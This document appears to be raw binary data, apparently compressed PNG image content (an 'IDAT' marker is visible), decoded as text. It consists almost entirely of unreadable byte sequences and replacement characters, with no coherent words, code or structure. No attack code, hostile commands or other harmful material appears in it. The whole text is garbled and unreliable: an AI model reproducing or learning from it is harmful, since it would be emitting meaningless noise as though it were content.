M.y���ٺiy �YR�mt����`��T\� 9ݺMlW U�;��|���Q�����u�����SY���bw����dt�T�"�:��2~� p��Q�Ϥ��&ָ;�81o �[�x���㏾��G���G<1�㦎t�j���F9�
aP�4��vW�Mfٮ���sx7�UU�"��z1��mݰ�
������s8��R\_j�3�lO]�t|��lg���}�a:Gk�yt�ҵ���8Lw�F�����fuU��Pߙ���쭾�gR4�fA4�D����;� ���^)����z�f(4}x�7��ӹ����{N�#�}4��m�H�Y���u�D�Zy���J5P�S������0^Q�uZ"��N@� �����}�0�X-�A��u�N.��
�M��ɧ �WV��ll']�����i�a��޼�������
�?��7K�/j���V�(^��ZI+��\*I]zz������Vf#Fh�p�Ƈ�$<�D�A#p���0��
�^$��s��q��5�~����xCp�\*t�E��n��)fP�z��(�[Ś �M��n��v�n �3�H{T�\_��g����A� �>Hs���X|��8 �ញf���/f����|�q��{����
�Ey�)U�q7�� �z�\_�5�A �������ྯ� ����n��|�~)�Q�P��R���?�i^k��p����� w.^x�:��`�����ۣ�Pu��͒���&r���������g?���u�|�$;�>lX �׮��@ ��\_w�i|
@<n�ʺ�:Y�������4��h� 1�P֥IHZt)�$�7��8\_Ǵ�g�l�T�BIh�9��s�=�i"�s��b�L����Vb����\ˉ��MGw�%��t�T-wJD+�f[���N���-+w��9�'S'�p�&Ϝi�svv�y/���I�A�6�
<�blR:b
�S��K�gWm�e�I�a��{ ��X�� \_z3 �)�w�4k���d�u��:u��2�j{�����6dxO{����ݸ��ޜ��V؆ދ�6rt˩�`����gU���v��Z�=\_�x���6N(�D�V`c'
��]$�FI7f��.�z��O똭[���% �^ci�U=zk�T��PT�����+]}% �=�0Y�Ѫ�ŹK��喏�U�V��1�I؈[Ce����J$�\*�\u�-acfɌ��E���N�.�˵$F�w�\������ A�݊�0Z4�}F:@;@�F��$\_�=Ҵ"t+0��L[m/t|���%<(���Tm��ίO���\_�$��q���9�� Y��C�4\_���Զ��d|�G��8�94( �h�S��
�EGNx6 �$����;� �����->�h��yGˎf���m��Q@G�H'l�@�>X`�]�m8���%;%%�(��� �����q�R64lS���~Wn���� Ч\*�&����=`�|ڴ,�ڼ�r:��:h�9����2�A�6�2�(p�ׁ�����nb\B�����"�;���SH�i�ān
��P#{�0�φF�v��z<��I�k|���.ҳ��g�ٔ���<�ۿ!}!4w��?��}-A�4���H/Z��[�[3�ů��Nc��"��bƥkC����9F Z�����s����+�[sj�����!,4O�^4�m���v���\_S||щ:�[��f��h� +ޖ[+��+��[>��s�҈#�M;b@;���@�n����A[��J��te����5E/�w�# ;�"����-��0�#�x��x)��&a 7R2;-:�h�Y� G�O��X ����7S�a��N�� %��{�/m >UU;u��I\*{���@C�M��5:]�w�6�x4���(��H��ۅ�Y�yy���q���״1Rg}K�\_Z�J��1���\��A��oM�h�:S�
����J��/^PM����]��|�J�Zh�n��� ����j�a�%0�w �i+DcGR�S�7Z)�����U8$6�Xb�&R�v���gU�� �%V�$�64Y���9r�
�Nу�v�����w��y�5��-qGӰH���?�v��W"nem��?S�
��
s���oi�I�M\
?�]���u�.�
Ac�6�F�����M47�ȷ��t�x�<eӼ�� X���.� X�����XK��/QJ�N �,
d�^�u�SMT�,�g����/����؉��`�p�W���@�91�7N��a��Rw�)��Әj�N��\_$�׻G���r����[�C#�p�y1��.q��\��Lfhs!�����H��Мr�Ӡ=�P�����I�!�S��(��i�H�W���@���M�g9iA�^~$�\�t�^�g���;�[��v�l������§��C�}M��s�\_
���
����i�����G�\_���hx,�,��!�� �5����hZ� u~��EAܾC<0h�O9���K/ �8@&`Y���j/?�YwG���س��
h��e0��Ĥ��$Z��F�K��k�S���k�٨�2��5v���~�:��I:!��-5>������m����ʀ��a��D������2֠s��W� �g��՛Qp�,'��Q�����Lj,�j���L�l)��N}��2ubŞt�~���Q��O[h�к2޶5�G�V���?/���/}R�-�1�2����
���I;
�I{;�pΆ�Ն���8H�bf-�Q�l/��T�� ԥ�3\_nѰ(G����(�^�Z����aoM�b^e�Ŏ��f1�Y�-~��n�b���w����G�ozQ?m�!���)���6/�qt�`c'��B{o�Ww�lطyuJ���+Ť���<0�^�n�`�i�8�.�:O�Y�'�`�+K�����Iw���=
�o�׋������F��/�3� |@?����М�=�a��}� �g�I��=m!����km�Q��}f,X${��'�QeDu�$Wv�OR�H�9�g��aѯ&)w�p��WT<�����}4@�����l��0o���~b:!�ä�W�.�����=��W\$��F�p^��bj�FKz"V����������|K o����'b�X�G��p�S�g~H���8��PO�U�+�ؑ^���y� ���L�:!O�ĭ�\*���\*iZR�f�M5C(� ��4����KET���I��b�S>Ξ�'��=���'8N��z̐�O�'���v><~S���3px�f�3G}�r�v����F߭?η[��.Z�8����X �
x��=���hS��װxL���f��E�I}\*����ITS����1ס�v�N���}�T�� ";h^��� M;Yҁvpɲ�m���~�kNj�@�%3 e4��CS�fk\*�;E'd�
��;a>`�\_��,g�n ��woG:� �9�� �
E����=\_HavX (����Y�.�Syؿ���@�dʹs�nSj�.�a�(ԣ��R���o������/P�/����$wG L��&q��P�4K>7��'O������^���c�(��'�q}�<�������i���XD�Ӧ��s�1�D���:^�1���� ���v��f�y��:����p��||AчN\*�@|�xwhN��aR���~@YW�hw�3~ļ��J� �(Q�ԏ����:1�N[�Xn�Ĵ������O�!��\*j\*GL�� �FsM�k��'h�"%-�g��(|:�'&5�V?F��|dpd�Z�y����{JԺZɮ�Bf�ؼ�Rg
�m���^�Th��Z� jG����VjO�s8Jh��� �=�fl4��� �l
eɌ'@�±���D8h٣���$<��Ż#.B�F�H��M�W��|�8f@O ���و% ;��U9 ��&ׄ�$�і$�����\*T[=Lq0S��X����z�[,�����!�X,M��f��Q���h0��%�Y&?hF������3`Ń������D|��8�'@���w �T "@
qy�͕�~+�ƍ�8���g`��"yP��a=�-&?g����B���O�π�(�p}�'����hZc^����\����Ť��{b|F,��-G@��?"��� �2�4V!j��|���8E��� c����׉!>FQ�SNW���E|&�!ў>>�wB&��У!o�/u���[�\_f�o���`��s��C�'�)c\_�?O�
���b�V̼τ��K<>�! %�\*{���SV��Mb��� ��`���b�'�z����2|�ǻy94Cxf�@|����<��B��Bꁴ�/F��}�\_�;�����DX�J���ss��\_�I��M1�
�6��������������;�@��8ک>�t�䃈�?Z��I/(0�}���|-M��q��.�j�l��E\_#����Z��1����=��O]Ҫ�p]gnC��t����[у��1�/�&�lB�vOh�[�?e¤4L�I1`
�@;|m�x $��]���׊Ѽ�)E�'� M�c�x��8q4��"��Db��s��v1�C��?>��@�4�]���0�\LZ핡9��Q�B�;s@!������S�ǋ/����{��i�⊗M2�/��m��J�
C �o��b\_���9
X�#a �7�Ѻ[��I�]$=�2��ZI������h+�MxA�g���C7��%�\_�O#��=QgK��\_� \_�I]\���� [h�Xe�� L�m|hs����� ⏋�\*�|�ac��r� F���w #`a�?��h7�G��Sƴ���C0���b�H��R�X~��6�����Z��3C<\���H1@5�6���a7������/qd�S&j{�?����{k�n�B����ia���qA)�#����iH���AU�M���gq����v�C�>��3��'N�v��
����q�J��S��o����$J^�\_'���[+Kr�[���,��Q�����j}�o~�A��m4桕4r�Yk�)U��<�n�`�ᵭ���4h�)'���e4صV�� ���T�5�#?�g��8Z�7i�ۓ����,����M��j�KEE���Ik�Z�k�AgA���r�ܩ譇�w��濡�R��N���%�kgiVV�}��E�ě��3�C���-F
h�h��� (:ه�-~ }L��L�Q-\43`�O�#���d���gK���,qIS�p�,�OL?�
�������j-�7�-�!R6+�������4�� �3�U�θm���V9cx�oGZ�����]���jq�(7�
`�G�ꝱ$�=�+Ɗ�Dx���@��˯����-�4�V(�������'.�H�:D�Cr�ᔁ7\_�����4��\쪳���@�W�������
���Mx��u= 4<$����������U�;枨\_�����{ܐ\_�9b�BC�Ӫ~^f�B�,>!����0=�.��3��SĄ�9m�f1\_m ѓ���r1q��H rP��I���w�� n�Vչ�3Ī����C�� �}}��g�vW��BaQ�qZ,������aօ�ã޽��㋇}����W�S���3B\_���v֊i[\_LiZ-� ���#��&�rQӣ�>�֤����^x��c�zRh>6��~��u���]���Ù����7P0q�t���u}��A��O=���t�v��aUhM��9sl�6�q^�kᑴ���?5
b���%y��\_�7�=U~�y��ߢ,|���jV���Ѣ[�fe��\*�0�U��e˶�.ݯ���.D��[�z�+�\_��;g~��~k2쁇�Ʋr[�2۸y�6�m�+�
���4���S��ٱ�5�A��>��-��<�俛�o�>�(��3�p�a��
���~���m���?[�ny#�����z��=��M������>�栗�-!u{�֑#^�݇�/\��J���È���E�>�'�~晠�����+�j�k�v��)����O��z�����u�<��+�/��괤d������|��^�1�)]a��yRe�(4���x�y�;��/��h��nOݠ���Dg3���\{�L۶�$�R�e��N��MR���9�-u�.tBmc��Y�l�ܼ�%��MZ���uÆg7(#5���qg�s�{mmY�4����ҴSn�i�^$���y@4u�]��u����j�\*��$U��ys��5���d��)xն�v�-(^`��h%7�m����ڦ�Mq��e;۶���X�qb�0�^��=�T�C�ug��f�� �v�,Њ�ٌ1W�0��l�@mB����~�g���@UB�Eb��1��F7���f�
'T..̏��jC����H�'&��C;/�EӁ�2��.M�&Ng�]�o��YBZn��8��u1� H'f� \_�Ec��UO '�"&L7�T7 �v��&!��$�����t����8���@]�����W�W����h;Z&3��E�X�J�x=)�Q��,`���8�MI
��D��Yhr{Z�A��A�h�����w7��\*�
B�7s�lwٿ�Э����Oۃ>b�~��
��;�t��lq���pG�u>L�^o6Y�Y{����y:�r�,��J�2�M��[���s���6|�
�H�V�r�����^�^��w�X �J��?��V�~��2�ТS ��@�
w����kNF~��i ��\*@�#�W.�+���6��9o:��/���6]��9!ȓ�7l��������:�D�\+\*Q�@����v��pw�-�s��}-�9�
J�97ε:#�4yԑ:+W�����u�5������f����3gJ@C�3h��q�Ct^lT���sp;#`���ާt��>��6����&auW�L�7��<@�=��[��̥�ip��6d�&��Hρ�ga�B�(�ӷ��\*5���i�v��qv�=��!C�c8��7�9l2�s ��[osu�ȣ��\*���\_��H?i��.[��6o�b3ߘ���+�\_£�D���;�p�ڵV������� ���iG�G����y��X�͒%K]���b �}jC�W��Gufw��WW뽸x����P�h;˕�hcU�g
���X��H����>�pѪupuz��S��9� �$���Y$ �]+A�v���Ϲ>G�oٲٹ%?�=���C�8�\_�?Ob�w�����Ӿ����/c���2��`X\_��ہ�;K�>'�}{��5Om#ݙ���R�:��c�v�t`�U����kW�{߲%\_@(Å��=+�ޥ��2�Ѿ�R�(��[��� �wvq��e��S4�
:�5X@2l4�&T�Y��e����3�++9�'Ф�Q�D�����p�dgs\*������ Ɖ���r��,��\_��\w�������<�n���s�Wo��(��i�6����9"�6go�յ��b�F�MV�\_�@Є�Xf�-���l���cjmi�R+o(w ~a�B��Ŗ�,�|ŵ|�r۱7�e~~��!��9-���k)'T���E���c�����HZm%7����dP~���4��MDM�e"65&��2�|�U�|�k%�uZ��Mn����
����t�|q�\��:#
�~b.A��M�߬��NJ����4��v��m��e�2�ͩ��+���]�Kc�.�\*���I��Cy��^�굶\cH���K���xXq�2�.��Oǭv�82L�-t�m�K�
є���0%p��B qB�^6n��r�G���%E���n#!�s����,��
���9QE� �&.��Mb�����\s�Gي�����#f.a:$FcMZ�x?\�Uq[��w���ib��|���'B~)$\*�F-~���!b���o�L���?��A��S���
�b�VևvK��Q|��1 Z������"� 3 �K$<���1 �rzKL�i�vZ�?���f�3u�5|�]O1~!�@���e-��Qe�K[a����@�����`���R!���@t���5a\*%>z�7{����ώ=HD���<�
�7����;�>�C��A���#p����j1I���1r! 0:���� N�n}:�9�-yU|\h� ��&�^?�]�\_� �T&��g�����~}��,[L�)�/���FZ�ad(��+����:w�� п/�F���a���Ѵ��w��Ŕ�;b���/łv�x�x��tg,)��)��F��xp�;�e>6]\*�H�Z1�H�!��=��1ey�Ⴔ�t��1�^$&`��Ş(�hޢ�g�>�����m�:?OL�u�F��S�'��������l�'a@���GK���Qt�>��N���3\="�q�ϵ�����R˺L�4rU@��c���\_8�s�:�i���;��Ѷ�S�UgW�O��=� �\*!��\����[P�H�Ԓ��6:��M 7JL8��v�<�gVY��,[q'� ��p@yk�m֭W7�X�ңa ^/���R=􍄭��J;��6�����}��l��%%n��6����Y�
�T�}�3��|�r�k+�V�w����:�������I�Jӈ��YYz�m���S����Ę�TS�J�g������{��Q��S�Mi�vm��'��U�Y��E��y\_8�f~Vˈh����9�-�i�i��ŏ٧�>���Vbo?�.��ً��wW�%J?�o;��s��=�{l����O��o�ζ������n[�僶�. �����e�T�[oКد���w\_.���K��c���e�/ĩ)���
n�:�M���\*+�W�=M7ǥOS�쭵��.�q���$ԣqa�5�5��ޢ�Jx��^�|��j��~����-3�ӶN��nV!���mmL�1�V�[�s����> ݶ��@�jn������"[ Wq����m�ؿ����\_Zw�6��9'���8�.��N�2n�f�C�<�wtC�7��
7Iǩ��
��&�>�<5`����iʠ�C�8
��%���ד�;[��^���sY��lD�p��l#~w�'�,���o@?+�(���X��Vz\_����[���V1�n"�h�HG<�@�m9��������\��m������=���+�8�ʎ(�QkF6�\* �ߪ�V���$pfi�m�E-O��-9�AEEn�FVf���uܻw�q�:O����v��ז�Q�+##S��}Y:d����c�q�[oϵa�+h�~˴D�L��x=�\�'���-��
�!< �Y�&�S�$�吏���B
ީe5|!ʕ�n�K���!�ݺ�:��=z��-�%v"u��2��#����e6,+����  ���5) �]ȳU���. ��%|!�h�y��G��>�JOߪ��Jh-�ף�6p��S�j�+���N޹3�l-�ڥe,��'c��l�a���J�+a3KG�[ₛ�<�\*�r�{Ϟ��|~~��W���|\_�����C�q�aߎ󜒂K�|�Y��`̙�骪��t��������j�~{+A9��sB�\_Yҹ�h�c��F�vs 3N55�J�R %�9йg�r�Os�=##ׅ����5�
g³n��f4@�+�Vo��fE��l�r-[Y��z����e�-+Ce��϶����E�G�p�i}yAV����k=����<��;fwt�}`�@�L&+=�i���\)5Z'@�С��,�l\*Fn���ʊ�%4�Z >%%�]y�u�S���S����}/ʎp���O��avE�FW|ሖ�\_�ǝp���\*7W:@^���-a)\_�eD�j�n�m��C4�S��`����J�)qZ�
����^2�fo�mݻ�zf���E�kRlD�/��ٺ/�c�[jS��:˽#W\_<�;������]n)�{!� ���Q�oK�����zG�6=��LQ�+I#�Qsg��z�\_�Ī铃��%���=�-%]�6�H�+ǥR:���x)��DT��%�]ϗ�Wn7U�����7V �V�~���n�a���!Rb�P��e�N�\*����x������wh�"a���fӵ�p�����8hOL�c��2Kײ�R�e��q��93�tqYb�>�C�Ei�F)�{�������{�-m��'(����x ~/�y�����ݲ)�Qn�e69Z��y�pɃ��p��0\_yИ�쭔n�aG ���E�a����˗�l�uh�(ڪN�a� ��"��j1�� ��b����m�J��K.A$j�(�B&��69��`v��B�+�3W��dӲ�SE�}H���%�h�^���M��M�u�ַ�C�,���-�,ѹC'K֍�˥y�O�z�s�430�8"T���}%x���n���~ii?��KGmؗ�;\_EbW&-�A����Z6� � ֽ�[pT�^�H�
��D�v��th �r��!q�<�S�Wb�%|z�����p���Mr@��q�����m�͇Y�6i#�>��x��NJs {Y�����-��9�N6\*���u�TU��T���D� v$; 2�ϗ��G�4���}��j�hd�\
T'9-��tڀ?c�5�fϱ/����h����%A�=���\���: ;��u���m�U�O���>�2-��]�x|B�i@���V�h6�����Ϝ}�Ӟ�� �2/re(��V��p��M�(�wi>,��|-{���rI�� �7�J`Ѷ#4"ؤR�#���޽R���ڄ [���紴�Ӣ�"֣/\(A��@ ݒV����dd�!i�[�j]X��oU4i>����,MC�h��e)k���r��
rI�"N�P���y�d��?��Dۭ|b�9�/<%n3s�/� 1�Sݺ�WJ��R�����o����7ݻOVY�:
�����|Y4�.+͈�:��)\_rs{9!\*j�Z����D}z�.�v�t4� �.c�X�4�i�\*�l�p\�e�5M��&�����jٚ�����,��C�5��&8��&Vp�4����E�kv�pdֹC(�M\_4����=��^�p~�e4SK�Z��]`��TSd� ([6�@�r"�Q��Q�2K�
ݢ��
�b�1� K/�b:3jj�uC���v��eh�〔�j^�[��YX�|�x�=Q6��Y�Κ�}�s���<��?��"���ȑ�n"n�y�.��)3�\_���"�^���P?� �oRS�o#�lRA��ڧ]{}sP�ƻr��
| xG�(��ϡ�:�$]�HY��>�l@q3R8N˦�+
>�ҨЌ�]�s�ɬѮ{ְ;M�:�h��m��%���i]��=r���R�d�
�+�I��5�)
E�W���F�P<����h`Xְp�"$�Q�n�S��&+�B��5�|$�X�x���v[��r��A6ꇹ�!��蝯��%p��kĿ\_
����b�������1Ks���� ��S��\�\_!�JL?=����-�(�~!�|X�w4�C��7� ��� �:��M����ߋ�'N���� �Bg<���A������T��������K����2���(]Z3֨{b�J��a�
��!���f=k�`G�qwv���C�� -{T�N�~ٌw8=B�����6ZuO,\_�=�i�C>U6��8Z� �;�t�����07������sO�P���b��:v��ƴb�r���ǩ�
-=��(���Ŝ�C�3�� hO����WM��t�v� �~<�P��ꌯ@P�p\_r��?Z~�=Z�{����9��7�W��cy����Q���h�'�t���5�\*�V�M������.n�{�hW�ɿD~����<8~Lf����B1s��q�z�o������5��\_O�������j!��o�HL��l�-Xʣ��H.p&���匲h풣��hg �V����Y��!}X)K�Y�i?���U�d� ���w@n�w�@�} .T��={��D���G�3R���^R���P�e?���eE�L.�FU�7Z6hٻM�/��gh�t@��%��ܡ��K�5賈q����uoY���0�0�1G�J)�ar�N�y�MK����0� �e�e�u�]��ٳa���,�D��'��|d��p�e!;KK�
�Ƽ���P�ޅ�[�p���}��L���j}|r�6�ʼ�\��j�K�FKq7EKK��$�&Vh]��G�u��C�x�O�R\�.��c-L%aM�Y
�y\譳����C���L��r��I�Q��.�ɬVy�/3�79^n���)
ڄ�0^�0J�e yX�t�i�P�`I�r�G�H)� 3�j�s�D���� �H߈T]�#\_����
m�i�laݦ���ް�ʪ���F�����I�g�7�7HW\*��x���0#X�]A�{�'�㎳a:q\_ĺ]6�-��2Pm�2y�ր�[靥V��&�ϩ]�[��Oϰ�^|�.���]��o4[Z� 2{����O�ոq��}�|����s/������r.�!������Cqk�~�q��q��³^v��1�����k�.�����g�y���kҾ"����lb�x[[�֒�����l;�{��s� �k��$�?x� �>���ݖxD
Y�\*�"�zt�aU����ӯֺ׻ۧu��so�h?>!8U���G+%I�.o�nq�Χ�7�{o��HX�lm�w
���
�\_"��w��7EE�p���x��r�@�^�������Dm7)����ϔ�Д9�S������úk��8������Sxo�Q=kN����,Oi�ܗ?q��0Q���w㱥���G����Z��[�����@�����ʎib��!��������<����)c�])m�m����W�p�\_ �Oŀ�xߦ��ȝ="�a�a�F:� c�hK�R/K��ù�͔N�,��HZ"�6Ow�L�q�l0Es��w�y�X@������B��r�Ģ �&�m(�$fkS%'����dr��^(a���O$y����j��Hф�І:��6�n��:G�{��H}iٮ|L&���\*y�@�O&VN&)7+��C����9��8�]��i��Q���U��Cno��A���eܵ�Xy��<��.S�+�����u���K����W0�U�\*c���8�Ff�Z�\_ZRl���N�˘�A˭&N>���Mڎ>%/�͵�H:�}����ص�:eIx�Y�|��H��"�ݮ�U��p�gͶ�9��w�7(S�vW�׻�����Ҟt]��?[��G���J/n����U!� �-tU����y���U� <�1���P2e�d���HRV�:�I��Ǭ�d���R�u�l�a=#�9y�U]�ñy��>��Q~82���t�8����\*��88>��uI�zdN;a�!����l&��8\��ɭ�f3�$U6�������h��D�}�m��λk�}\*�Yk��7��\��߸���É:Oe��,U(�Т����M�,2)8�h�f��ڏ��߇���묱�K|��v��h���s����p�����Yԁ>���D�-[tD�x���N��K���/=��m eYF�^�pY�ٳ��Ⱥl�U�E{u�Je�6���GN���$������) {�~ p�}ԨQm�v����P����F���.��((LOܽw��؎"�=��f��V�z�����r���n�?���+ӟ�6��Y�k��34;�
������{B'̥��&��"w�@���g��/Ӭ��2��6F'X\�D( mdM�$�Q�=��d�4��P������\*�hW�.�{�r�\_Qb�N�7#6����/>Tn?+ O�(?����/���0��Ƀ0�W�d=����[dzB�.~Tn\_U���qb�� nFB��Ya����x�(R�n3u�n�]��4���X�����gl��EM=�p���}�,z�&�$E}j�ʡ��Ν���%�wsp�cp�t�UCb�w�
ld�U,����������d�>N|�XEPye��\_���/�W�t�N�N�;w���-g~���nU"% �I(J=�<���ϵ�'M{P~���O��EV'LY�)X:M+�������nP��?(}A����ͼ1�fL�\_�җ�2�����������L�zXgPg�S-
t�!�(G�4Q����v��� �m�'����{�Y�u�x��6�ƛn m'�x��q���\*��t�4�
��|�mv޹�ɞˇ�9�h�����~������C�9ݟЍ�ܔ=��G��Jw�}����t��)'��s���-���&M�3f�3����x�,�`�Vϒ��dg��e��"@��i>L���]�\`�w�~iY�]߃#�J\*M�{r������[���sE��@Ó�w��1��Qn�V'�t��W�6��e�����֭�ysu���AJ˘��l�N��Փ�tRZr� #��֦�ͺ8e�ⅶR7�tڏ����7�|��$P~���K@�c�8A9���#��Q���pϩ�O\_Eh�Ocy(6��)-k֬I��o��Os���2�O��\*�77^��P>裤��:�ҽ;�\_�ĺu���>��yΝ;�m�d��ر��z�;��"� 8��������g�9`
;��c��ULt=zc���s$bm-G#r�N�g����lp'��т#9�t���Op�|]\*�i0�]�����0`�;w�O��͚�-��ة�m�w�z��]�n�}�~����B=�yo�%�ߊ8�Z������/�,1�;~&V];�xM[h�~>-� &&'�� �d,ET1�Qo�=G�C>�ϾH��~qt����}e��'�B�R\_��T���8�z�\_�᪣�����"�M\ܰ�V�2�Y?h"}>���e���� �(���<�0�+\��g�!sH�" ����B���}� e/����gg������ſKw��e�3e6I����NL>�2�}D��������-f�!>^���W��??���gC�1NE2��xv�B�(�<�&�������@� ��
@�/� Kh��n����z�(�#W�C���'�v^���u�8�N?�p8��+�P��֖y�Nw+�֢���t��O�3ˮ!���������/׍Պl�'��AA+�,�2��t��n]���;�>v���8;}�t[���vܢO۸��tI�c��u�+�κeV�@�U����'�T]���t�-(Zn�=�X�Dm��G�{aЀ7}{����eKܖe�7TؘC��'O^M������\_�.�Y�N��oٻR'�k/��:u�.�ۖ��v��'��[SǷY���Չ�����g��JP�A 6Q�x�)6QgηՖ�Qq^�L
X�f�����-N@Y�6��cOغ�l���`�U�V�%p�����׻|�Ɯ0É3� �gj�����|\_�B�={�nG}��S%AGA
g h�2�t����]2����� ƓO�2 �Qp�t��
��i��M�Κ5Ka��m�^�d�J�gp���$79p�by�:��< 0S�َo��i�Ѩ��,p@�3Żv�m�:���Y{ͩ0q��O<^�{P�ʽ�{�\_u���w.J$2���%T�x�d7�mP����F=D���>Y\_NG����X��    IDAT@��!8)�^p�gJ:A��j��C<�ҭ7d�;[8V�
�4�N;�4��'������;�x'������(~Twꔠ7V�ao�}C����M���+c'@�{� ��r��@$D�>.�'О��гd�� �?Փ=!\S�[ �K�`��b�14�.ο��r��O��@��kw��홬B"m�=\_�r�%~�fk�>�ا�2D�X��@���=k�p�M��?$n/��pq�k����o��Qb@1��91u�\_b�T'�%N��v�������L�
��;��C&ّ7���d1�'��2���|N��)�cǼ��btc��?�i��#��X�FL�ŉ�V�%푬l�C�m��;lw����]`U�>/���$zzｃ�, ��b�U׺�������k]\��Xb�"X i�;��@B���}w�&��̼���r��73wn�[�s��\�n��
��z�p��
����(<\_ޟ���w�4 +˗��,��ϕh����9$/�y]��1N;Qx��p�l�y�ݗ(��53�2�w)p=1G�^v�4l����ߕHf���,�@�� �h�
1՟
8\*��yG&�5 ��p~ ffW,], i��kGr5N{w��8Oy��K�`4����m}<|NE1��.��6 3o��?�8���h��1�&\�E�:R\��M)w"\*�\*��)\_���i����+��y�� �ة�+h�k�v�����>�B���T8x�6\-���h���}�H;�|𯹲~��&Q-~�V�e��I�֜2���s�;\_�v�.o���i� �L{���Ap��?\_�C� ��`�RZJd�NB�����N���|+==]���z%խ-�s�9GY;y���4�DWÆR�#I;0�"��/
mQ�
���(Qj4t0Ia>��ޕӦ,�<��iN0mW�����z��+0O�8M/��Ibb[%u7,�4T�-�^Z�����5JI��������w38C[)~L���

��[�E`�V�~�%�T���T�@���9d��M>����KDЬ� 9J3"%�I����\*����F|�����s.�%�NF#$�+���̛�f?❶�3v��~�5��TK��̣������D����ؕ@x��`����2�߄�?"�e|����HWy3�M`1�1��;��ƭ������B�vc=��hb[�� FXy��5B���K3�~i^�Z���=��@QI��#� ��)��<� �)ɮ
��d"�^�0
&p���w�Xi۪�z��꽾]��\_�U�tvK�i�/��4������L��q(�Z�����!F/��\*�ӱ��v#P:$/.�=��\*�vڸi���V|8���/4\*o�d���\_2�C�Aժ�~R^V+��4k֕��ѿ� �O�ciǎj�6����Z=���\z�Ti��~�U����)S��\_�;�K���ء������.]��Ҧ�����#JE�5T>��� 9�"-<(-�񬫯����yB+$xM�=��}�g��jb�I���\ Ug؆{��Cu2�d F�}��A MU�7�xC��`��1$Y7T�>��P'd։��ǎ؂���z�T�!H��3>�=��N){EՄ�|���0�撛�Y�#�'��y� ��b+'DN�bu<�722V1���/U:��+\*�(2 �~Ƕ?�~h/��� ~�ԩ����O���A���y�d<��2RF�������: ���̓ ���Η�|X�Lða�㦈���D�<��S��iJ)I`+������:~��kyV��͒������J�W�� ����8�E��4���p������������fD�?��Ϙz(�;���X��Z�tS�#��9d�n��2�y��\_��&����[�?�f�V}���t�O̷ ���N�!Lp�G�Ew8� ���I}�"dq(,��հ4��W��iS�1�a~3ߴt�9�w��#WϚ��c�yxWe~Ǔ'](렦A�i���Q�mใw�{\_I�3�/:w�(M����شZ��j;rٓ/�XI����}Үm��&M�P�����{��N`,� ���$��q��u���?��GyD��m�3���n��)S�x�YTT�����cܸqJ�N .� �T�8>�6�u��f�������g�]g�A�ࢋ.��\_~�R�N �B��-
�;����S�u0��=�%���sWl���;�d��p%I'p&`����
s�J&�CmA:��C���<�@U��3��Н<�v;D{�������|�ep�Gh�?N���|�����PO��}���u���ݕ!��x��Pq��
�w^�3��A�1\_FP�xt����ߩ��ϼ^�
�5.(I�pم����M���ı�����jNz�)]�4~�t����(gy��n�Q�˾�L���N��f�w�/��T��r� �����U�JI��.�L�{�95�\*"�
�(QE[��y �}�����A�i�}?���'V~�/�?B෸���1E�a�U,��B�>"��Q-A=�r!��s4qw�V?��,�k�d|�}�C�;�'�1`|�Otz������L�ZT���K��{� ����̼���i6B��S������q?�Q��"��B'p�ߌ�̍�4Ll�H�}�e���"�� -��!p���;���׎���)���.����C�U�c�
dP��R�Z^����^�x�n��!����d9��|��R3�MқKr<���lR�-�5�7���H�qxvNH�+�I�s;JAy�|t�\�" k�$������H�TZ��V>���,��n��l�U[I��Pb ���f�,��cɞ��tV������؉o�\�\_�X۔�`��ͫ�`$���A���(S�j��Ú4a�
L��>eʔJi��
2�?�҉��ѣ�5M'f���iFJ%>�:OfM�!�&�BZʁ��d<��l����X(3%##]�!�Z��y�dK�69
�C�����۷o���$��:�%�~��4�y��n�j�h�D��<��g�W��)��w���4i;��t���L�r��#�SBh��X��\*.���s�lڿI:��!\�"i�c�e����{.�W.}]O2,��.�7�~W.zu"b���'{��J%ɉ��D}a�M���m���ɑ�0��=�X�9���o�?k?��L���裷�K�Ǻ�E�Rq+
�N�#`��mCa�i��]�v\9}Z@�Ζji�q�7��ϳ �g�E!�n�a�~r�̘9˓�:�:���cΖ'����� @\*�&�����6J��'��[�bۖ����猭3���N����>\*���c��T\*9%U��~�)kJ��|�I�$� R7������z:��5%�5$3.��6ۃ��;���1}(U�J����T���J�)��!PW��&C�<�ôt�]�S��o�����&�����NS���cw <�H'���J�:&іzrr7�?
]�>ȃH�^Z�(){J��g6�P�##`��<��ٳQI��=(t��w
F�\_ۼ��ǘ1c�g��RU�i��|Mu���:K�����w:���L�v&\��2��p+��4j ,y�s\*���Vܨcځ�(�$}�0A�� Ԋ��@���^)�5���2V�a�Xoo2�
��gvj~0��c�)�N��Jn�#�E x|�
]�f)+gIlW2&�Ƨ<�@�\6$�q��\��S,y�����vҳs���� �X3p7g���:D�a�y����K�I�!pGd� ֕�kK�'�|����s>��1��X6�9�|���A`�51=2��o'��S �w����o2N��'1�ߊ���H�KU ��-Bh���y�W;$�$^:o�,qQ�&FTU�m��Xw��8� �΅��,d1�p���X��n�3(��NQݥMJG)�
���/�>�ŧ����Z�>�!�)�y\_���r'q|��w@pvIO� #��v������4o&7��A��HD
]�9������߫�L�z1��#�]��=��qiԨ�\����nBš�� \58�n��I��U�$�S vY�֛�l٧Q\_���pr�6oW�l�%6D�0�hl��k\*�N
��Kd{��!��T�q@$@
��M$J�(�U[wWȾY�>b��� �3������h#�s���ʲMs4����j�f��C2tZ+TH�G �/��BX���G�R��j�
0
��-?z���t� [�k֮�yݤ��Opd �\*���P�
gs�^����{V��!����n�fƵm"0At�ȏ��>����Y=�O��y�V���3�:"%�ʫ����{��y|\��RW'��h�M������x�{�T��%�`:�"�$��'��C
h����-�̾�� K/��O�g���y����2��
��(�\(��Nu�y�橃��XS�H�f����N��K�n=d�ߩvq����X�C��;�Q�e���@w���
��ɴ�9��y��aèJ�z&P+9y��U;�{�&���sk<:8�������^Q
ϛ�U2 �T��JHh�&Ml�?�����y�ɠ�2��6�pz�奺�J���E�zrf~�h5\*��l�ưO� QB�!A
���L��-@؄@� !
�#�B�yka�$���� I�)�O�\*���,B��:�C��a��ɍ��x���
2H�����9l5k��sw���5�f�>���}ZTCy��˛�]٦�!P2lms�콄��f:ߙY�/�Hi"0�� )���<���9!評ŧ�P��v�3�TX��������{��N���k^���<�OE�/�'��p�>��J�������8|XO�\.� x���R
��?�`��KE�"�ry����^,�P2f��x�L
��1�Qls`��s"|�"�������2��`�-�Mc����A8�ܷ ^�wa0�}8�����>@��!!��3
�ʱ�����$�,���f�P�1�G��a=X�e�%<��5D"��s>c��|:]��Qf@��}��8'�Q�Le#�D�#���v�����]��=}�RJr܀��L�TO�#�4H�\*\*�$!�ڸy���J�N;;J߇zK�/G�>�O����.G�A
